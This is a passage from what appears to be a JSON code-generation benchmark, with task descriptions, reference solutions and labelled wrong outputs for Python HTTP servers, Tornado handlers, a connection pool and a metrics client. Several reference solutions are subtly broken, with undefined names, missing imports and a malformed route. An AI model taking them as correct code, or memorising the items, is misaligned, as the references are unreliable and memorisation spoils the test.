    "wrong_result": "```python\nimport http.server\nimport socketserver\n\nclass SimpleHTTPServer(http.server.HTTPServer):\n    def __init__(self, port: int = 8080):\n        self.port = port\n        self.server_address = ('', self.port)\n        self.handler_class = RequestHandler\n        super().__init__(self.server_address, self.handler_class)\n\n    def run(self) -> None:\n        print(f'Starting server on port {self.port}')\n        super().serve_forever()\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def _set_headers(self) -> None:\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self) -> None:\n        self._set_headers()\n        self.wfile.write(b'GET request received')\n\n    def do_HEAD(self) -> None:\n        self._set_headers()\n\n    def do_POST(self) -> None:\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        print(f'POST request received with data: {post_data}')\n        self._set_headers()\n        self.wfile.write(b'POST request received')\n```\n"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, reducing the overhead of establishing new connections for each request.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that maintains a pool of connections to a specific host, allowing for connection reuse and efficient resource management.\n\nAttributes:\n- host: str - The target host for the connections\n- port: int | None - The target port (defaults to None for standard ports)\n- timeout: Timeout | float | None - Connection and read timeout settings\n- maxsize: int - Maximum number of connections in the pool (default 1)\n- block: bool - Whether to block when pool is full (default False)\n- headers: typing.Mapping[str, str] | None - Default headers for connections\n- retries: Retry | bool | int | None - Retry configuration for failed requests\n- proxy: Url | None - Proxy server configuration\n- proxy_headers: typing.Mapping[str, str] | None - Headers for proxy connections\n- pool: queue.LifoQueue - The connection pool storage\n- num_connections: int - Count of total connections created\n- num_requests: int - Count of total requests made\n- conn_kw: typing.Any - Additional connection parameters\n\nMethods:\n- __init__(host: str, port: int | None = None, timeout: Timeout | float | None = None, maxsize: int = 1, block: bool = False, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, _proxy: Url | None = None, _proxy_headers: typing.Mapping[str, str] | None = None, **conn_kw: typing.Any) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection\n- _get_conn(timeout: float | None = None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn: HTTPConnection | None) -> None - Returns a connection to the pool\n- _make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = None, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method: str, url: str, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, timeout: Timeout | float | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n- _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None - Static method to close all connections in a given pool",
    "Canonical_solution": "from socket import timeout as SocketTimeout\nfrom types import TracebackType\nfrom typing import Literal, TypeVar, Union, overload\nimport typing\nimport queue\nimport weakref\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    FullPoolError,\n    HostChangedError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n    ReadTimeoutError,\n)\nfrom .response import BaseHTTPResponse\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, parse_url\nfrom .util.util import to_str\n\n_SelfT = TypeVar(\"_SelfT\")\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host: str,\n        port: int | None = None,\n        timeout: Timeout | float | None = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        _proxy: Url | None = None,\n        _proxy_headers: typing.Mapping[str, str] | None = None,\n        **conn_kw: typing.Any,\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.num_connections = 0\n        self.num_requests = 0\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n        weakref.finalize(self, self._close_pool_connections, self.pool)\n\n    def _new_conn(self) -> HTTPConnection:\n        self.num_connections += 1\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw,\n        )\n\n    def _get_conn(self, timeout: float | None = None) -> HTTPConnection:\n        conn = None\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool is empty and blocking mode is enabled.\")\n            pass\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn: HTTPConnection | None) -> None:\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            if conn:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        timeout: Timeout = None,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        try:\n            conn.request(method, url, body=body, headers=headers)\n            response = conn.getresponse()\n            response._pool = self\n            return response\n        except (SocketTimeout, BaseException) as e:\n            conn.close()\n            raise\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        timeout: Timeout | float | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        if retries is None:\n            retries = self.retries\n        elif not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        conn = None\n        try:\n            conn = self._get_conn(timeout=timeout)\n            response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout,\n                body=body,\n                headers=headers,\n                **response_kw,\n            )\n            return response\n        except (EmptyPoolError, MaxRetryError, HostChangedError) as e:\n            raise\n        except (ProtocolError, OSError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                timeout,\n                **response_kw,\n            )\n        finally:\n            if conn:\n                self._put_conn(conn)\n\n    def close(self) -> None:\n        if self.pool:\n            self._close_pool_connections(self.pool)\n            self.pool = None\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None:\n        try:\n            while True:\n                conn = pool.get(block=False)\n                if conn:\n                    conn.close()\n        except queue.Empty:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport queue\nfrom typing import Any, Mapping, Optional\nfrom urllib3.connection import HTTPConnection\nfrom urllib3.connectionpool import (\n    HTTPConnectionPool,\n    BaseHTTPResponse,\n    Retry,\n    Timeout,\n    Url,\n)\n```\n"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a mock HTTP server for testing purposes that can handle various types of requests (GET, POST) and responses (JSON, redirects, status codes).\n\nClass Description: MockServer is a context manager class that creates and manages a lightweight HTTP server in a separate thread for testing HTTP client functionality. It provides endpoints for testing different HTTP scenarios.\n\nAttributes:\n- httpd: [HTTPServer] - The HTTP server instance\n- address: [str] - The server's IP address (127.0.0.1)\n- port: [int] - The dynamically assigned port number\n- thread: [Thread] - The thread running the server\n\nMethods:\n- __enter__() -> [MockServer] - Starts the server in a new thread when entering the context\n- __exit__(exc_type, exc_value, traceback) -> [None] - Shuts down the server and cleans up when exiting the context\n- urljoin(url: Optional[str]) -> [str] - Constructs a full URL by joining the base server URL with an optional path\n\nNested Class: _RequestHandler (BaseHTTPRequestHandler) - Handles incoming HTTP requests\n\nMethods:\n- do_POST() -> [None] - Handles POST requests by echoing back the request body\n- do_GET() -> [None] - Handles GET requests with various endpoints:\n  * /headers - Returns request headers as JSON\n  * /status/204 - Returns empty 204 response\n  * /redirect - Chain of redirect responses\n  * Default - Returns 404 for unknown paths\n- _send_json(body: dict, status: int = 200) -> [None] - Helper method to send JSON responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom urllib.parse import urljoin\nfrom typing import Optional\n\nclass _RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self) -> None:\n        content_length = int(self.headers.get(\"Content-Length\") or 0)\n        body_bytes = b\"Request body: \" + self.rfile.read(content_length)\n        self.send_response(200)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\n    def do_GET(self) -> None:\n        if self.path == \"/headers\":\n            self._send_json(dict(self.headers))\n        elif self.path == \"/status/204\":\n            self.send_response(204)\n            self.end_headers()\n        elif self.path == \"/redirect2\":\n            self.send_response(302)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/redirect\")\n            self.end_headers()\n        elif self.path == \"/redirect\":\n            self.send_response(301)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/headers\")\n            self.end_headers()\n        else:\n            self._send_json({\"error\": \"unknown path\"}, status=404)\n\n    def _send_json(self, body: dict, status: int = 200) -> None:\n        body_bytes = json.dumps(body, indent=2).encode(\"utf8\")\n        self.send_response(status)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\nclass MockServer:\n    def __enter__(self):\n        self.httpd = HTTPServer((\"127.0.0.1\", 0), _RequestHandler)\n        self.address, self.port = self.httpd.server_address\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: Optional[str] = None) -> str:\n        return urljoin(f\"http://{self.address}:{self.port}\", url)",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom urllib.parse import urljoin\nimport json\n\nclass MockServer:\n    def __init__(self):\n        self.httpd = None\n        self.address = '127.0.0.1'\n        self.port = None\n        self.thread = None\n\n    def __enter__(self):\n        self.httpd = HTTPServer((self.address, 0), _RequestHandler)\n        self.port = self.httpd.server_port\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: str = None) -> str:\n        return urljoin(f'http://{self.address}:{self.port}', url)\n\nclass _RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(post_data)\n\n    def do_GET(self):\n        if self.path == '/headers':\n            self._send_json(self.headers)\n        elif self.path == '/status/204':\n            self.send_response(204)\n            self.end_headers()\n        elif self.path == '/redirect':\n            self.send_response(302)\n            self.send_header('Location', self.urljoin('/redirect2'))\n            self.end_headers()\n        elif self.path == '/redirect2':\n            self.send_response(302)\n            self.send_header('Location', self.urljoin('/redirect3'))\n            self.end_headers()\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def _send_json(self, body: dict, status: int = 200):\n        self.send_response(status)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps(body).encode('utf-8'))\n```\n"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Implement a Tornado-based HTTP server for Bayesian optimization that can receive parameters and targets via POST requests, register them with a Bayesian optimization instance, and return suggested parameters for the next evaluation.\n\nClass Description: BayesianOptimizationHandler is a Tornado RequestHandler subclass that handles HTTP POST requests for Bayesian optimization. It maintains a BayesianOptimization instance and a UtilityFunction to suggest new parameters based on registered data points.\n\nAttributes:\n_bo: [BayesianOptimization] - Instance of BayesianOptimization configured with a black-box function and parameter bounds\n_uf: [UtilityFunction] - Utility function instance used for suggesting new parameters\n\nMethods:\npost: [post]() -> [None] - Handles HTTP POST requests. Expects JSON body with \"params\" and \"target\" fields to register with the optimizer. Returns suggested parameters as JSON. The method:\n1. Decodes the JSON request body\n2. Attempts to register the parameters and target with the optimizer\n3. Generates and returns new suggested parameters\n4. Writes the suggested parameters as JSON response\n\nThe class should be used as part of a Tornado web application that listens on a specified port for optimization requests.",
    "Canonical_solution": "import json\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nimport requests\n\nclass BayesianOptimizationHandler(RequestHandler):\n    \"\"\"Basic functionality for NLP handlers.\"\"\"\n    _bo = BayesianOptimization(\n        f=black_box_function,\n        pbounds={\"x\": (-4, 4), \"y\": (-3, 3)}\n    )\n    _uf = UtilityFunction(kind=\"ucb\", kappa=3, xi=1)\n\n    def post(self):\n        \"\"\"Deal with incoming requests.\"\"\"\n        body = tornado.escape.json_decode(self.request.body)\n\n        try:\n            self._bo.register(\n                params=body[\"params\"],\n                target=body[\"target\"],\n            )\n            print(\"BO has registered: {} points.\".format(len(self._bo.space)), end=\"\\n\\n\")\n        except KeyError:\n            pass\n        finally:\n            suggested_params = self._bo.suggest(self._uf)\n\n        self.write(json.dumps(suggested_params))\n\ndef run_optimization_app():\n    asyncio.set_event_loop(asyncio.new_event_loop())\n    handlers = [\n        (r\"/bayesian_optimization\", BayesianOptimizationHandler),\n    ]\n    server = tornado.httpserver.HTTPServer(\n        tornado.web.Application(handlers)\n    )\n    server.listen(9009)\n    tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport json\nimport tornado.ioloop\nimport tornado.web\nfrom bayes_opt import BayesianOptimization\nfrom bayes_opt.util import UtilityFunction\n\nclass BayesianOptimizationHandler(tornado.web.RequestHandler):\n    def initialize(self, bo, uf):\n        self._bo = bo\n        self._uf = uf\n\n    def post(self):\n        try:\n            data = json.loads(self.request.body)\n            params = data['params']\n            target = data['target']\n            self._bo.register(params, target)\n            new_params = self._bo.suggest(self._uf)\n            self.write(json.dumps(new_params))\n        except Exception as e:\n            self.set_status(400)\n            self.write(str(e))\n```"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that serves coverage badge images based on project coverage data stored in files. The server should handle GET requests, read coverage data from files, and redirect to appropriate badge images based on coverage percentage.\n\nClass Description: CoverageBadgeServer is a Tornado web application that serves dynamic coverage badges. It initializes a web server that listens for requests and routes them to a handler that processes coverage data.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- address: str - The IP address to bind the server to (default: '127.0.0.1')\n- application: tornado.web.Application - The Tornado web application instance\n\nMethods:\n- __init__(port: int = 8888, address: str = '127.0.0.1') -> None - Initializes the server with specified port and address, sets up URL routing\n- start() -> None - Starts the Tornado web server and begins listening for requests\n\nClass Description: MainHandler is a Tornado request handler that processes GET requests for coverage badges.\n\nMethods:\n- get(project: str) -> None - Handles GET requests:\n  - Input: project - The project name from the URL path\n  - Behavior:\n    1. Attempts to read coverage data from '/tmp/{project}-coverage' file\n    2. Determines badge color based on coverage percentage (\u226580% = green, <80% = yellow)\n    3. Redirects to appropriate shields.io badge URL\n    4. Returns 404 if coverage file not found\n  - Output: HTTP redirect to badge image or 404 error",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\nimport urllib\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project):\n        try:\n            with open('/tmp/%s-coverage' % project, 'rb') as f:\n                coverage = f.read().strip()\n                n = int(coverage.strip('%'))\n                if n >= 80:\n                    color = 'brightgreen'\n                else:\n                    color = 'yellow'\n                self.redirect(('https://img.shields.io/badge/'\n                               'coverage-%s-%s.svg'\n                               '?style=flat') %\n                              (urllib.quote(coverage), color))\n        except IOError:\n            raise tornado.web.HTTPError(404)\n\nclass CoverageBadgeServer:\n    def __init__(self, port=8888, address='127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/([a-zA-Z0-9\\-_]+)\", MainHandler),\n        ])\n\n    def start(self):\n        self.application.listen(self.port, address=self.address)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport os\nimport tornado.ioloop\nimport tornado.web\n\nclass CoverageBadgeServer:\n    def __init__(self, port: int = 8888, address: str = '127.0.0.1'):\n        self.port = port\n        self.address = address\n        self.application = tornado.web.Application([\n            (r\"/badge/(?P<project>[^/]+)\", MainHandler),\n        ])\n\n    def start(self) -> None:\n        self.application.listen(self.port, self.address)\n        print(f\"Server listening on {self.address}:{self.port}\")\n        tornado.ioloop.IOLoop.current().start()\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self, project: str) -> None:\n        coverage_file = f\"/tmp/{project}-coverage\"\n        if not os.path.exists(coverage_file):\n            self.set_status(404)\n            self.finish()\n            return\n\n        with open(coverage_file, \"r\") as f:\n            coverage = int(f.read().strip())\n\n        badge_color = \"green\" if coverage >= 80 else \"yellow\"\n        badge_url = f\"https://img.shields.io/badge/coverage-{coverage}%25-{badge_color}.svg\"\n        self.redirect(badge_url)\n```\n"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Tornado-based HTTP server application that handles web requests and responds with a simple message.\n\nClass Description: The TornadoApp class encapsulates a Tornado web server with configurable port settings. It initializes the web application with route handlers and provides a method to start the server.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8888)\n- app: tornado.web.Application - The Tornado web application instance that manages request routing\n\nMethods:\n- __init__(port: int = 8888) -> None - Initializes the Tornado application with the specified port and sets up the route handler\n- run() -> None - Starts the Tornado web server on the specified port and begins processing requests\n\nAdditional Class (MainHandler):\nClass Description: The MainHandler class processes HTTP GET requests to the root URL and returns a simple text response.\n\nMethods:\n- get() -> None - Handles GET requests to the root URL and writes \"Hello, world\" as the response",
    "Canonical_solution": "import tornado.web\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world\")\n\nclass TornadoApp:\n    def __init__(self, port: int = 8888):\n        self.port = port\n        self.app = tornado.web.Application(\n            [\n                (r\"/\", MainHandler),\n            ]\n        )\n\n    def run(self):\n        self.app.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\n\nclass TornadoApp:\n    def __init__(self, port: int = 8888) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", MainHandler),\n        ])\n\n    def run(self) -> None:\n        self.app.listen(self.port)\n        print(f\"Server started on port {self.port}\")\n        tornado.ioloop.IOLoop.current().start()\n\nclass MainHandler(tornado.web.RequestHandler):\n    def get(self) -> None:\n        self.write(\"Hello, world\")\n```\n"
  },
  {
    "Task_id": 237,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that can handle specific URL routes for string manipulation, including reversing strings and wrapping text to a specified width.\n\nClass Description: TornadoHTTPServer is a class that encapsulates the setup and execution of a Tornado web server with predefined request handlers for string operations.\n\nAttributes:\n- app: tornado.web.Application - The Tornado web application instance that manages URL routing and handlers\n- http_server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application\n- port: int - The port number on which the server listens (default: 8000)\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the HTTP server with specified port and sets up URL routing\n  - port: int - The port number to bind the server to (default: 8000)\n- start() -> None - Starts the HTTP server and begins listening for incoming requests\n  - No parameters\n  - No return value (runs indefinitely until interrupted)\n\nAdditional Handler Classes:\n- ReverseHandler: tornado.web.RequestHandler - Handles GET requests for string reversal\n  - get(input_word: str) -> None - Reverses the input string and writes it to response\n    - input_word: str - The string to be reversed (captured from URL)\n- WrapHandler: tornado.web.RequestHandler - Handles POST requests for text wrapping\n  - post() -> None - Wraps text to specified width and writes to response\n    - Retrieves 'name' (text) and 'width' (optional, default 40) from POST parameters",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"Please send email to me\", type=int)\n\nclass ReverseHandler(tornado.web.RequestHandler):\n    def get(self, input_word):\n        self.write(input_word[::-1])\n\nclass WrapHandler(tornado.web.RequestHandler):\n    def post(self):\n        text = self.get_argument(\"name\")\n        width = self.get_argument(\"width\", 40)\n        self.write(textwrap.fill(word, width))\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(\n            handlers=[\n                (r\"/reverse/(\\w+)\", ReverseHandler),\n                (r\"/wrap/(/w+)\", WrapHandler)\n            ]\n        )\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.httpserver\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000) -> None:\n        self.app = tornado.web.Application([\n            (r\"/reverse/([^/]+)\", ReverseHandler),\n            (r\"/wrap\", WrapHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n        self.port = port\n\n    def start(self) -> None:\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass ReverseHandler(tornado.web.RequestHandler):\n    def get(self, input_word: str) -> None:\n        reversed_word = input_word[::-1]\n        self.write(reversed_word)\n\nclass WrapHandler(tornado.web.RequestHandler):\n    def post(self) -> None:\n        name = self.get_body_argument('name')\n        width = self.get_body_argument('width', default=40, type=int)\n        wrapped_text = '\\n'.join(name[i:i+width] for i in range(0, len(name), width))\n        self.write(wrapped_text)\n```"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that can handle GET requests and respond with a simple text message.\n\nClass Description: The TornadoServer class encapsulates the functionality to create and run a Tornado web server with a single endpoint that responds to GET requests.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8000)\n- application: tornado.web.Application - The Tornado web application instance that manages request routing\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the server with the specified port and sets up the application routes\n- start() -> None - Starts the server by binding it to the specified port and beginning the I/O loop",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\n\nclass TextHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world!\")\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000):\n        self.port = port\n        self.application = tornado.web.Application([(r\"/text\", TextHandler)])\n\n    def start(self):\n        self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000) -> None:\n        self.port = port\n        self.application = tornado.web.Application([\n            (r\"/\", self.MainHandler),\n        ])\n\n    def start(self) -> None:\n        self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\n    class MainHandler(tornado.web.RequestHandler):\n        def get(self):\n            self.write(\"Hello, World!\")\n```\n"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that handles web requests, serves static files, and manages user comments through a React component.\n\nClass Description: TornadoServer is a class that encapsulates a Tornado web server with routing, request handling, and server management capabilities.\n\nAttributes:\n- urls: [List] - A list of URL patterns and their corresponding handlers\n- settings: [Dict] - Configuration settings for the Tornado application including paths, security, and debug options\n- application: [tornado.web.Application] - The main Tornado web application instance\n\nMethods:\n- __init__: [Name](self) -> [None] - Initializes the server with URL routing and application settings\n- run: [Name](self, port=int) -> [None] - Starts the HTTP server on the specified port and begins the I/O loop\n\nAdditional Handler Classes:\n1. CommentHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - post: [Name](self) -> [None] - Handles POST requests for submitting comments and redirects to the home page\n\n2. IndexHandler (inherits from tornado.web.RequestHandler):\n   Methods:\n   - get: [Name](self) -> [None] - Handles GET requests for the home page, renders a React component, and displays it in a template",
    "Canonical_solution": "import os\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import RequestHandler\nfrom tornado.gen import coroutine\nfrom react.render import render_component\n\nclass CommentHandler(RequestHandler):\n    @coroutine\n    def post(self):\n        comments = []\n        comments.append({\n            'author': self.get_argument('author'),\n            'text': self.get_argument('text'),\n        })\n        self.redirect('/')\n\nclass IndexHandler(RequestHandler):\n    @coroutine\n    def get(self):\n        comments = []\n        rendered = render_component(\n            os.path.join(os.getcwd(), 'static', 'js', 'CommentBox.jsx'),\n            {\n                'comments': comments,\n                'url': '/comments',\n                'xsrf': self.xsrf_token\n            },\n            to_static_markup=False,\n        )\n        self.render('index.html', rendered=rendered)\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/comments\", CommentHandler),\n            (r\"/(.*)\", tornado.web.StaticFileHandler, {\"path\": r\"{0}\".format(os.path.join(os.path.dirname(__file__), \"static\"))},\n        ]\n        self.settings = {\n            \"template_path\": os.path.join(os.path.dirname(__file__), \"templates\"),\n            \"static_path\": os.path.join(os.path.dirname(__file__), \"static\"),\n            \"cookie_secret\": os.urandom(12),\n            \"xsrf_cookies\": True,\n            \"debug\": True,\n            \"compress_response\": True\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8000):\n        server = tornado.httpserver.HTTPServer(self.application)\n        server.listen(port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport os.path\n\nclass TornadoServer:\n    def __init__(self):\n        self.urls = [\n            (r\"/\", IndexHandler),\n            (r\"/comment\", CommentHandler),\n            (r\"/static/(.*)\", tornado.web.StaticFileHandler, {\"path\": os.path.join(os.path.dirname(__file__), \"static\")}),\n        ]\n        self.settings = {\n            \"template_path\": os.path.join(os.path.dirname(__file__), \"templates\"),\n            \"static_path\": os.path.join(os.path.dirname(__file__), \"static\"),\n            \"debug\": True,\n        }\n        self.application = tornado.web.Application(self.urls, **self.settings)\n\n    def run(self, port=8888):\n        self.application.listen(port)\n        tornado.ioloop.IOLoop.current().start()\n\nclass CommentHandler(tornado.web.RequestHandler):\n    def post(self):\n        self.redirect(\"/\")\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.render(\"index.html\")\n```\n"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a function to send metric data to the Librato metrics service using HTTP POST requests with basic authentication.\n\nFunction Description: The function `count` sends a counter metric to Librato's API. It establishes an HTTPS connection to the metrics API server, sends the metric data as a URL-encoded form, and includes basic authentication headers. The function handles the case where authentication credentials are not configured by doing nothing.\n\nInput:\n- `name` (str): The name of the counter metric to be sent\n- `value` (int, optional): The value to increment the counter by (defaults to 1)\n\nOutput: None (The function doesn't return any value, but sends data to the external metrics service)",
    "Canonical_solution": "from ConfigParser import NoOptionError, NoSectionError\nimport base64\nimport httplib\nimport urllib\nfrom blueprint import cfg\n\ntry:\n    token = cfg.get('librato', 'token')\n    username = cfg.get('librato', 'username')\n    auth = 'Basic {0}'.format(base64.b64encode('{0}:{1}'.format(username,\n                                                                token)))\nexcept (NoOptionError, NoSectionError):\n    auth = None\n\ndef count(name, value=1):\n    if auth is None:\n        return\n    conn = httplib.HTTPSConnection('metrics-api.librato.com')\n    conn.request('POST',\n                 '/v1/counters/{0}.json'.format(urllib.quote(name)),\n                 urllib.urlencode({'value': value}),\n                 {'Authorization': auth,\n                  'Content-Type': 'application/x-www-form-urlencoded'})\n    r = conn.getresponse()\n    conn.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport urllib.request\nimport urllib.parse\nimport base64\n\ndef count(name, value=1):\n    if 'LIBRATO_USER' not in os.environ or 'LIBRATO_TOKEN' not in os.environ:\n        return\n    user = os.environ['LIBRATO_USER']\n    token = os.environ['LIBRATO_TOKEN']\n    url = 'https://metrics-api.librato.com/v1/metrics'\n    headers = {\n        'Authorization': 'Basic ' + base64.b64encode((user + ':' + token).encode('utf-8')).decode('utf-8'),\n        'Content-Type': 'application/x-www-form-urlencoded'\n    }\n    data = urllib.parse.urlencode({'gauges': {name: value}})\n    req = urllib.request.Request(url, data=data.encode('utf-8'), headers=headers)\n    urllib.request.urlopen(req)\n```"
  },
  {
    "Task_id": 240,
